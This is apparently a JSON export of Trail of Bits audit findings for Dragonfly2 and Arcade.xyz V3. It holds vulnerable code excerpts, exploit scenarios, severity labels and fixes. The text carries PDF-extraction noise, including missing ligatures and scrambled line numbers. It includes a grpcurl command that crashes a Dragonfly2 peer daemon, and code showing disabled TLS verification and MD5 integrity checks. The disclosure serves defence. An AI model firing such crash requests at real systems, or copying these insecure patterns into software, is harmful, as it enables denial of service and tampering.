URL meta info. common.UrlMeta url_meta = 2 ; // File to be imported. string path = 3 [(validate.rules). string .min_len = 1 ]; // Task type. common.TaskType type = 4 ; } Figure 14.1: ImportTaskRequest denition, with the url_meta eld missing any validation rules ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#7685 ) grpcurl -plaintext -format json -d \\ '{\"url\":\"http://example.com\", \"path\":\"x\"}' $PEER_IP:65000 dfdaemon.Daemon.ImportTask Figure 14.2: An example command that triggers panic in the daemon gRPC server s.Keep() peerID := idgen.PeerIDV1(s.peerHost.Ip) taskID := idgen.TaskIDV1(req.Url, req.UrlMeta) log := logger.With( \"function\" , \"ImportTask\" , \"URL\" , req.Url, \"Tag\" , req.UrlMeta.Tag, \"taskID\" , taskID, \"file\" , req.Path) Figure 14.3: The req.UrlMeta variable may be nil ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#871874 ) Another example of weak validation can be observed in the denition of the UrlMeta request (gure 14.4). The digest eld of the request should contain a prex followed by an either MD5 or SHA256 hex-encoded hash. While prex and hex-encoding is validated, length of the hash is not. The length is validated only during the parsing . // UrlMeta describes url meta info. message UrlMeta { // Digest checks integrity of url content, for example md5:xxx or sha256:yyy. string digest = 1 [(validate.rules). string = {pattern: \"^(md5)|(sha256):[A-Fa-f0-9]+$\" , ignore_empty: true }]; Figure 14.4: The UrlMeta request denition, with a regex validation of the digest eld ( api/pkg/apis/common/v1/common.proto#163166 ) Recommendations Short term, add missing validations for the ImportTaskRequest and UrlMeta messages. Centralize validation of external inputs, so that it is easy to understand what properties are enforced on the data. Validate data as early as possible (for example, in the proto-related code). Long term, use fuzz testing to detect missing validations.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "15. Weak integrity checks for downloaded les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The DragonFly2 uses a variety of hash functions, including the MD5 hash. This algorithm does not provide collision resistance; it is secure only against preimage attacks. While these security guarantees may be enough for the DragonFly2 system, it is not completely clear if there are any scenarios where lack of the collision resistance would compromise the system. There are no clear benets to keeping the MD5 hash function in the system. Figure 15.1 shows the core validation method that protects the integrity of les downloaded from the peer-to-peer network. As shown in the gure, the hash of a le (sha256) is computed over hashes of all les pieces (MD5). So the security provided by the more secure sha256 hash is lost, because of use of the MD5. var pieceDigests [] string for i := int32 ( 0 ); i < t.TotalPieces; i++ { pieceDigests = append (pieceDigests, t.Pieces[i].Md5) } digest := digest.SHA256FromStrings(pieceDigests...) if digest != t.PieceMd5Sign { t.Errorf( \"invalid digest, desired: %s, actual: %s\" , t.PieceMd5Sign, digest) t.invalid.Store( true ) return ErrInvalidDigest } Figure 15.1: Part of the method responsible for validation of les integrity ( Dragonfly2/client/daemon/storage/local_storage.go#255265 ) The MD5 algorithm is hard coded over the entire codebase (e.g., gure 15.2), but in some places the hash algorithm is congurable (e.g., gure 15.3). Further investigation is required to determine whether an attacker can exploit the congurability of the system to perform downgrade attacksthat is, to downgrade the security of the system by forcing users to use the MD5 algorithm, even when a more secure option is available. reader, err = digest.NewReader( digest.AlgorithmMD5 , io.LimitReader(resp.Body, int64 (req.piece.RangeSize)), digest.WithEncoded(req.piece.PieceMd5), digest.WithLogger(req.log)) Figure 15.2: Hardcoded hash function ( Dragonfly2/client/daemon/peer/piece_downloader.go#188 ) switch algorithm { case AlgorithmSHA1: if len (encoded) != 40 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmSHA256: if len (encoded) != 64 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmSHA512: if len (encoded) != 128 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmMD5: if len (encoded) != 32 { return nil , errors.New( \"invalid encoded\" ) } default : return nil , errors.New( \"invalid algorithm\" ) } Figure 15.3: User-congurable hash function ( Dragonfly2/pkg/digest/digest.go#111130 ) Moreover, there are missing validations of the integrity hashes, for example in the ImportTask method (gure 15.5). // TODO: compute and check hash digest if digest exists in ImportTaskRequest Figure 15.4: Missing hash validation ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#904 ) Exploit Scenario Alice, a peer in the DragonFly2 system, creates two images: an innocent one, and one with malicious code. Both images consist of two pieces, and Alice generates the pieces so that their respective MD5 hashes collide (are the same). Therefore, the PieceMd5Sign metadata of both images are equal. Alice shares the innocent image with other peers, who attest to their validity (i.e., that it works as expected and is not malicious). Bob wants to download the image and requests it from the peer-to-peer network. After downloading the image, Bob checks its integrity with a SHA256 hash that is known to him. Alice, who is participating in the network, had already provided Bob the other image, the malicious one. Bob unintentionally uses the malicious image. Recommendations Short term, remove support for the MD5. Always use SHA256, SHA3, or another secure hashing algorithm. Long term, take an inventory of all cryptographic algorithms used across the entire system. Ensure that no deprecated or non-recommended algorithms are used.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "16. Invalid error handling, missing return statement ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "There are two instances of a missing return statement inside an if branch that handles an error from a downstream method. The rst issue is in the UpdateTransportOption function, where failed parsing of the Proxy option prints an error, but does not terminate execution of the UpdateTransportOption function. func UpdateTransportOption(transport *http.Transport, optionYaml [] byte ) error { [skipped] if len (opt.Proxy) > 0 { proxy, err := url.Parse(opt.Proxy) if err != nil { fmt.Printf( \"proxy parse error: %s\\n\" , err) } transport.Proxy = http.ProxyURL(proxy) } Figure 16.1: the UpdateTransportOption function ( Dragonfly2/pkg/source/transport_option.go#4558 ) The second issue is in the GetV1Preheat method, where failed parsing of the rawID argument does not result in termination of the method execution. Instead, the id variable will be assigned either the zero or max_uint value. func (s *service) GetV1Preheat(ctx context.Context, rawID string ) (*types.GetV1PreheatResponse, error ) { id, err := strconv.ParseUint(rawID, 10 , 32 ) if err != nil { logger.Errorf( \"preheat convert error\" , err) } Figure 16.2: the GetV1Preheat function ( Dragonfly2/manager/service/preheat.go#6670 ) Recommendations Short term, add the missing return statements in the UpdateTransportOption method. Long term, use static analysis to detect similar bugs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "17. Tiny le download uses hard coded HTTP protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The code in the scheduler for downloading a tiny le is hard coded to use the HTTP protocol, rather than HTTPS. This means that an attacker could perform a Man-in-the-Middle attack, changing the network request so that a dierent piece of data gets downloaded. Due to the use of weak integrity checks ( TOB-DF2-15 ), this modication of the data may go unnoticed. // DownloadTinyFile downloads tiny file from peer without range. func (p *Peer) DownloadTinyFile() ([] byte , error ) { ctx, cancel := context.WithTimeout(context.Background(), downloadTinyFileContextTimeout) defer cancel() // Download url: http://${host}:${port}/download/${taskIndex}/${taskID}?peerId=${peerID} targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , p.ID), \"http\" , fmt.Sprintf( \"%s:%d\" , p.Host.IP, p.Host.DownloadPort), fmt.Sprintf( \"download/%s/%s\" , p.Task.ID[: 3 ], p.Task.ID), } Figure 17.1: Hard-coded use of HTTP ( Dragonfly2/scheduler/resource/peer.go#435446 ) Exploit Scenario A network-level attacker who cannot join a peer-to-peer network performs a Man-in-the-Middle attack on peers. The adversary can do this because peers (partially) communicate over plaintext HTTP protocol. The attack chains this vulnerability with the one described in TOB-DF2-15 to replace correct les with malicious ones. Unconscious peers use the malicious les. Recommendations Short term, add a conguration option to use HTTPS for these downloads. Long term, audit the rest of the repository for other hard-coded uses of HTTP.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "18. Incorrect log message ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The scheduler service may sometimes output two dierent logging messages stating two dierent reasons why a task is being registered as a normal task. The following code is used to register a peer and trigger a seed peer download task. // RegisterPeerTask registers peer and triggers seed peer download task. func (v *V1) RegisterPeerTask(ctx context.Context, req *schedulerv1.PeerTaskRequest) (*schedulerv1.RegisterResult, error ) { [skipped] // The task state is TaskStateSucceeded and SizeScope is not invalid. switch sizeScope { case commonv1.SizeScope_EMPTY: [skipped] case commonv1.SizeScope_TINY: // Validate data of direct piece. if !peer.Task.CanReuseDirectPiece() { direct piece is %d, content length is %d\" , len (task.DirectPiece), task.ContentLength.Load()) peer.Log.Warnf( \"register as normal task, because of length of break } result, err := v.registerTinyTask(ctx, peer) if err != nil { peer.Log.Warnf( \"register as normal task, because of %s\" , err.Error()) break } return result, nil case commonv1.SizeScope_SMALL: result, err := v.registerSmallTask(ctx, peer) if err != nil { peer.Log.Warnf( \"register as normal task, because of %s\" , err.Error()) break } return result, nil } result, err := v.registerNormalTask(ctx, peer) if err != nil { peer.Log.Error(err) v.handleRegisterFailure(ctx, peer) return nil , dferrors.New(commonv1.Code_SchedError, err.Error()) } peer.Log.Info( \"register as normal task, because of invalid size scope\" ) return result, nil } Figure 18.1: Code snippet with incorrect logging ( Dragonfly2/scheduler/service/service_v1.go#93173 ) Each of the highlighted sets of lines above print register as normal task, because [reason], before exiting from the switch statement. Then, the task is registered as a normal task. Finally, another message is logged: register as normal task, because of invalid size scope. This means that two dierent messages may be printed (one as a warning message, one as an informational message) with two contradicting reasons for why the task was registered as a normal task. This does not cause any security problems directly but may lead to diculties while managing a DragonFly system or debugging DragonFly code. Recommendations Short term, move the peer.Log.Info function call into a default branch in the switch statement so that it is called only when the size scope is invalid.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Manager makes requests to external endpoints with disabled TLS authentication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The Manager disables TLS certicate verication in two HTTP clients (gures 3.1 and 3.2). The clients are not congurable, so users have no way to re-enable the verication. func getAuthToken(ctx context.Context, header http.Header) ( string , error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.1: getAuthToken function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#261301 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.2: getManifests function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#211233 ) Exploit Scenario A Manager processes dozens of preheat jobs. An adversary performs a network-level Man-in-the-Middle attack, providing invalid data to the Manager. The Manager preheats with the wrong data, which later causes a denial of service and le integrity problems. Recommendations Short term, make the TLS certicate verication congurable in the getManifests and getAuthToken methods. Preferably, enable the verication by default. Long term, enumerate all HTTP, gRPC, and possibly other clients that use TLS and document their congurable and non-congurable (hard-coded) settings. Ensure that all security-relevant settings are congurable or set to secure defaults. Keep the list up to date with the code.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Incorrect handling of a task structures usedTra\u0000c eld ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The processPieceFromSource method (gure 4.1) is part of a task processing mechanism. The method writes pieces of data to storage, updating a Task structure along the way. The method does not update the structures usedTraffic eld, because an uninitialized variable n is used as a guard to the AddTraffic method call, instead of the result.Size variable. var n int64 result.Size, err = pt.GetStorage().WritePiece( [skipped] ) result.FinishTime = time.Now().UnixNano() if n > 0 { pt.AddTraffic( uint64 (n)) } Figure 4.1: Part of the processPieceFromSource method with a bug ( Dragonfly2/client/daemon/peer/piece_manager.go#264290 ) Exploit Scenario A task is processed by a peer. The usedTraffic metadata is not updated during the processing. Rate limiting is incorrectly applied, leading to a denial-of-service condition for the peer. Recommendations Short term, replace the n variable with the result.Size variable in the processPieceFromSource method. Long term, add tests for checking if all Task structure elds are correctly updated during task processing. Add similar tests for other structures.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "19. Usage of architecture-dependent int type ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The DragonFly2 uses int and uint numeric types in its golang codebase. These types bit sizes are either 32 or 64 bits, depending on the hardware where the code is executed. Because of that, DragonFly2 components running on dierent architectures may behave dierently. These discrepancies in behavior may lead to unexpected crashes of some components or incorrect data handling. For example, the handlePeerSuccess method casts peer.Task.ContentLength variable to the int type. Schedulers running on dierent machines may behave dierently, because of this behavior. if len (data) != int (peer.Task.ContentLength.Load()) { peer.Log.Errorf( \"download tiny task length of data is %d, task content length is %d\" , len (data), peer.Task.ContentLength.Load()) return } Figure 19.1: example use of architecture-dependent int type ( Dragonfly2/scheduler/service/service_v1.go#12401243 ) Recommendations Short term, use a xed bit size for all integer values. Alternatively, ensure that using the int type will not impact any computing where results must agree on all participants computers. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "Arcade has enabled optional compiler optimizations in Solidity. According to a November 2018 audit of the Solidity compiler, the optional optimizations may not be safe. 147 148 149 150 optimizer: { enabled: optimizerEnabled, runs: 200, }, Figure 2.1: The solc optimizer settings in arcade-protocol/hardhat.config.ts High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018; the x for this bug was not reported in the Solidity changelog. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Another bug due to the incorrect caching of Keccak-256 was reported. It is likely that there are latent bugs related to optimization and that future optimizations will introduce new bugs. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Arcade contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 25 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "3. callApprove does not follow approval best practices ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The AssetVault.callApprove function has undocumented behaviors and lacks the increase/decrease approval functions, which might impede third-party integrations. A well-known race condition exists in the ERC-20 approval mechanism. The race condition is enabled if a user or smart contract calls approve a second time on a spender that has already been allowed. If the spender sees the transaction containing the call before it has been mined, they can call transferFrom to transfer the previous value and then still receive authorization to transfer the new value. To mitigate this, AssetVault uses the SafeERC20.safeApprove function, which will revert if the allowance is updated from nonzero to nonzero. However, this behavior is not documented, and it might break the protocols integration with third-party contracts or o-chain components. 282 283 284 285 286 287 288 289 290 291 292 293 294 295 37 38 39 40 41 42 function callApprove( address token, address spender, uint256 amount ) external override onlyAllowedCallers onlyWithdrawDisabled nonReentrant { if (!CallWhitelistApprovals(whitelist).isApproved(token, spender)) { revert AV_NonWhitelistedApproval(token, spender); } // Do approval IERC20(token).safeApprove(spender, amount); emit Approve(msg.sender, token, spender, amount); } Figure 3.1: The callApprove function in arcade-protocol/contracts/vault/AssetVault.sol /** * @dev Deprecated. This function has issues similar to the ones found in * {IERC20-approve}, and its usage is discouraged. * * Whenever possible, use {safeIncreaseAllowance} and * {safeDecreaseAllowance} instead. 26 Arcade.xyz V3 Security Assessment */ function safeApprove( IERC20 token, address spender, uint256 value ) internal { 43 44 45 46 47 48 49 50 51 52 53 54 55 56 spender, value)); 57 } // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, Figure 3.2: The safeApprove function in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol An alternative way to mitigate the ERC-20 race condition is to use the increaseAllowance and decreaseAllowance functions to safely update allowances. These functions are widely used by the ecosystem and allow users to update approvals with less ambiguity. uint256 newAllowance = token.allowance(address(this), spender) + value; _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, } ) internal { function safeDecreaseAllowance( function safeIncreaseAllowance( IERC20 token, address spender, uint256 value 59 60 61 62 63 64 65 spender, newAllowance)); 66 67 68 69 70 71 72 73 74 75 zero\"); 76 77 abi.encodeWithSelector(token.approve.selector, spender, newAllowance)); 78 79 uint256 newAllowance = oldAllowance - value; _callOptionalReturn(token, IERC20 token, address spender, uint256 value ) internal { unchecked { } } uint256 oldAllowance = token.allowance(address(this), spender); require(oldAllowance >= value, \"SafeERC20: decreased allowance below Figure 3.3: The safeIncreaseAllowance and safeDecreaseAllowance functions in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol 27 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, the owner of an asset vault, sets up an approval of 1,000 for her external contract by calling callApprove. She later decides to update the approval amount to 1,500 and again calls callApprove. This second call reverts, which she did not expect. Recommendations Short term, take one of the following actions:  Update the documentation to make it clear to users and other integrating smart contract developers that two transactions are needed to update allowances.  Add two new functions in the AssetVault contract: callIncreaseAllowance and callDecreaseAllowance, which internally call SafeERC20.safeIncreaseAllowance and SafeERC20.safeDecreaseAllowance, respectively. Long term, when using external libraries/contracts, always ensure that they are being used correctly and that edge cases are explained in the documentation. 28 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "4. Risk of confusing events due to missing checks in whitelist contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The CallWhitelist contracts add and remove functions do not check whether the given call has been registered in the whitelist. As a result, add could be used to register calls that have already been registered, and remove could be used to remove calls that have never been registered; these types of calls would still emit events. For example, invoking remove with a call that is not in the whitelist would emit a CallRemoved event even though no call was removed. Such an event could confuse o-chain monitoring systems, or at least make it more dicult to retrace what happened by looking at the emitted event. 64 65 66 67 function add(address callee, bytes4 selector) external override onlyOwner { whitelist[callee][selector] = true; emit CallAdded(msg.sender, callee, selector); } Figure 4.1: The add function in arcade-protocol/contracts/vault/CallWhitelist.sol 75 76 77 78 function remove(address callee, bytes4 selector) external override onlyOwner { whitelist[callee][selector] = false; emit CallRemoved(msg.sender, callee, selector); } Figure 4.2: The remove function in arcade-protocol/contracts/vault/CallWhitelist.sol A similar problem exists in the CallWhitelistDelegation.setRegistry function. This function can be called to set the registry address to the current registry address. In that case, the emitted RegistryChanged event would be confusing because nothing would have actually changed. 85 86 87 88 89 function setRegistry(address _registry) external onlyOwner { registry = IDelegationRegistry(_registry); emit RegistryChanged(msg.sender, _registry); } 29 Arcade.xyz V3 Security Assessment Figure 4.3: The setRegistry function in arcade-protocol/contracts/vault/CallWhitelistDelegation.sol Arcade has explained that the owner of the whitelist contracts in Arcade V3 will be a (set of) governance contract(s), so it is unlikely that this issue will happen. However, it is possible, and it could be prevented by more validation. Exploit Scenario No calls have yet been added to the whitelist in CallWhitelist. Through the governance system, a proposal to remove a call with the address 0x1 and the selector 0x12345678 is approved. The proposal is executed, and CallWhitelist.remove is called. The transaction succeeds, and a CallRemoved event is emitted, even though the removed call was never in the whitelist in the rst place. Recommendations Short term, add validation to the add, remove, and setRegistry functions. For the add function, it should ensure that the given call is not already in the whitelist. For the remove function, it should ensure that the call is currently in the whitelist. For the setRegistry function, it should ensure that the new registry address is not the current registry address. Adding this validation will prevent confusing events from being emitted and ease the tracing of events in the whitelist over time. Long term, when dealing with function arguments, always ensure that all inputs are validated as tightly as possible and that the subsequent emitted events are meaningful. Additionally, consider setting up an o-chain monitoring system that will track important system events. Such a system will provide an overview of the events that occur in the contracts and will be useful when incidents occur. 30 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Missing checks of _exists() return value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The ERC-721 _exists() function returns a Boolean value that indicates whether a token with the specied tokenId exists. In two instances in Arcades codebase, the function is called but its return value is not checked, bypassing the intended result of the existence check. In particular, in the PromissoryNote.tokenURI() and VaultFactory.tokenURI() functions, _exists() is called before the URI for the tokenId is returned, but its return value is not checked. If the given NFT does not exist, the URI returned by the tokenURI() function will be incorrect, but this error will not be detected due to the missing return value check on _exists(). 165 function tokenURI(uint256 tokenId) public view override(INFTWithDescriptor, ERC721) returns (string memory) { 166 167 168 169 } _exists(tokenId); return descriptor.tokenURI(address(this), tokenId); Figure 5.1: The tokenURI function in arcade-protocol/contracts/PromissoryNote.sol 48 function tokenURI(address, uint256 tokenId) external view override returns (string memory) { 49 return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\"; 50 } Figure 5.2: The tokenURI function in arcade-protocol/contracts/nft/BaseURIDescriptor.sol Exploit Scenario Bob, a developer of a front-end blockchain application that interacts with the Arcade contracts, develops a page that lists users' promissory notes and vaults with their respective URIs. He accidentally passes a nonexistent tokenId to tokenURI(), causing his application to show an incorrect or incomplete URI. 31 Arcade.xyz V3 Security Assessment Recommendations Short term, add a check for the _exists() functions return value to both of the tokenURI() functions to prevent them from returning an incomplete URI for nonexistent tokens. Long term, add new test cases to verify the expected return values of tokenURI() in all contracts that use it, with valid and invalid tokens as arguments. 32 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Incorrect deployers in integration tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The xture deployment function in the provided integration tests uses dierent signers for deploying the Arcade contracts before performing the tests. All Arcade contracts are meant to be deployed by the protocol team, except for vaults, which are deployed by users using the VaultFactory contract. However, in the xture deployment function, some contracts are deployed from the borrower account instead of the admin account. Some examples are shown in gure 6.1; however, there are other instances in which contracts are not deployed from the admin account. const whitelist = <CallWhitelist>await deploy(\"CallWhitelist\", signers[0], const signers: SignerWithAddress[] = await ethers.getSigners(); const [borrower, lender, admin] = signers; 71 72 73 74 []); 75 76 77 signers[0], [BASE_URI]) 78 [vaultTemplate.address, whitelist.address, feeController.address, descriptor.address]); const vaultTemplate = <AssetVault>await deploy(\"AssetVault\", signers[0], []); const feeController = <FeeController>await deploy(\"FeeController\", admin, []); const descriptor = <BaseURIDescriptor>await deploy(\"BaseURIDescriptor\", const vaultFactory = <VaultFactory>await deploy(\"VaultFactory\", signers[0], Figure 6.1: A snippet of the tests in arcade-protocol/test/Integration.ts Exploit Scenario Alice, a developer on the Arcade team, adds a new permissioned feature to the protocol. She adds the relevant integration tests for her feature, and all tests pass. However, because the deployer for the test contracts was not the admin account, those tests should have failed, and the contracts are deployed to the network with a bug. Recommendations Short term, correct all of the instances of incorrect deployers for the contracts in the integration tests le. 33 Arcade.xyz V3 Security Assessment Long term, add additional test cases to ensure that the account permissions in all deployed contracts are correct. 34 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Risk of out-of-gas revert due to use of transfer() in claimFees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The VaultFactory.claimFees function uses the low-level transfer() operation to move the collected ETH fees to another arbitrary address. The transfer() operation sends only 2,300 units of gas with this operation. As a result, if the recipient is a contract with logic inside the receive() function, which would use extra gas, the operation will probably (depending on the gas cost) fail due to an out-of-gas revert. 194 195 196 197 198 199 function claimFees(address to) external onlyRole(FEE_CLAIMER_ROLE) { uint256 balance = address(this).balance; payable(to).transfer(balance); emit ClaimFees(to, balance); } Figure 7.1: The claimFees function in arcade-protocol/contracts/vault/VaultFactory.sol The Arcade team has explained that the recipient will be a treasury contract with no logic inside the receive() function, meaning the current use of transfer() will not pose any problems. However, if at some point the recipient does contain logic inside the receive() function, then claimFees will likely revert and the contract will not be able to claim the funds. Note, however, that the fees could be claimed by another address (i.e., the fees will not be stuck). The withdrawETH function in the AssetVault contract uses Address.sendValue instead of transfer(). function withdrawETH(address to) external override onlyOwner 223 onlyWithdrawEnabled nonReentrant { 224 225 226 227 228 // perform transfer uint256 balance = address(this).balance; payable(to).sendValue(balance); emit WithdrawETH(msg.sender, to, balance); } 35 Arcade.xyz V3 Security Assessment Figure 7.2: The withdrawETH function in arcade-protocol/contracts/vault/AssetVault.sol Address.sendValue internally uses the call() operation, passing along all of the remaining gas, so this function could be a good candidate to replace use of transfer() in claimFees. However, doing so could introduce other risks like reentrancy attacks. Note that neither the withdrawETH function nor the claimFees function is currently at risk of reentrancy attacks. Exploit Scenario Alice, a developer on the Arcade team, deploys a new treasury contract that contains an updated receive() function that also writes the received ETH amount into a storage array in the treasury contract. Bob, whose account has the FEE_CLAIMER_ROLE role in the VaultFactory contract, calls claimFees with the newly deployed treasury contract as the recipient. The transaction fails because the write to storage exceeds the passed along 2,300 units of gas. Recommendations Short term, consider replacing the claimFees functions use of transfer() with Address.sendValue; weigh the risk of possibly introducing vulnerabilities like reentrancy attacks against the benet of being able to one day add logic in the fee recipients receive() function. If the decision is to have claimFees continue to use transfer(), update the NatSpec comments for the function so that readers will be aware of the 2,300 gas limit on the fee recipient. Long term, when deciding between using the low-level transfer() and call() operations, consider how malicious smart contracts may be able to exploit the lack of limits on the gas available in the recipient function. Additionally, consider the likelihood that the recipient will be a smart wallet or multisig (or other smart contract) with logic inside the receive() function, as the 2,300 gas from transfer() might not be sucient for those recipients. 36 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Risk of lost funds due to lack of zero-address check in functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The VaultFactory.claimFees (gure 8.1), RepaymentController.redeemNote (gure 8.2), LoanCore.withdraw, and LoanCore.withdrawProtocolFees functions are all missing a check to ensure that the to argument does not equal the zero address. As a result, these functions could transfer funds to the zero address. 194 195 196 197 198 199 function claimFees(address to) external onlyRole(FEE_CLAIMER_ROLE) { uint256 balance = address(this).balance; payable(to).transfer(balance); emit ClaimFees(to, balance); } Figure 8.1: The claimFees function in arcade-protocol/contracts/vault/VaultFactory.sol function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 126 127 128 129 130 RC_InvalidState(data.state); 131 132 133 134 BASIS_POINTS_DENOMINATOR; 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 8.2: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Exploit Scenario A script that is used to periodically withdraw the protocol fees (calling LoanCore.withdrawProtocolFees) is updated. Due to a mistake, the to argument is left 37 Arcade.xyz V3 Security Assessment uninitialized. The script is executed, and the to argument defaults to the zero address, causing withdrawProtocolFees to transfer the protocol fees to the zero address. Recommendations Short term, add a check to verify that to does not equal the zero address to the following functions:  VaultFactory.claimFees  RepaymentController.redeemNote  LoanCore.withdraw  LoanCore.withdrawProtocolFees Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts. 38 Arcade.xyz V3 Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "9. The maximum value for FL_09 is not set by FeeController ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "The FeeController constructor initializes all of the maximum values for the fees dened in the FeeLookups contract except for FL_09 (LENDER_REDEEM_FEE). Because the maximum value is not set, it is possible to set any amount, with no upper bound, for that particular fee. The lender's redeem fee is used in RepaymentControllers redeemNote function to calculate the fee paid by the lender to the protocol in order to receive their funds back. If the protocol team accidentally sets the fee to 100%, all of the users' funds to be redeemed would instead be used to pay the protocol. 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 constructor() { /// @dev Vault mint fee - gross maxFees[FL_01] = 1 ether; /// @dev Origination fees - bps maxFees[FL_02] = 10_00; maxFees[FL_03] = 10_00; /// @dev Rollover fees - bps maxFees[FL_04] = 20_00; maxFees[FL_05] = 20_00; /// @dev Loan closure fees - bps maxFees[FL_06] = 10_00; maxFees[FL_07] = 50_00; maxFees[FL_08] = 10_00; } Figure 9.1: The constructor in arcade-protocol/contracts/FeeController.sol function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); 126 127 128 129 130 RC_InvalidState(data.state); 131 if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); 39 Arcade.xyz V3 Security Assessment if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 132 133 134 BASIS_POINTS_DENOMINATOR; 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 9.2: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Exploit Scenario Charlie, a member of the Arcade protocol team, has access to the privileged account that can change the protocol fees. He wants to set LENDERS_REDEEM_FEE to 5%, but he accidentally types a 0 and sets it to 50%. Users can now lose half of their funds to the new protocol fee, 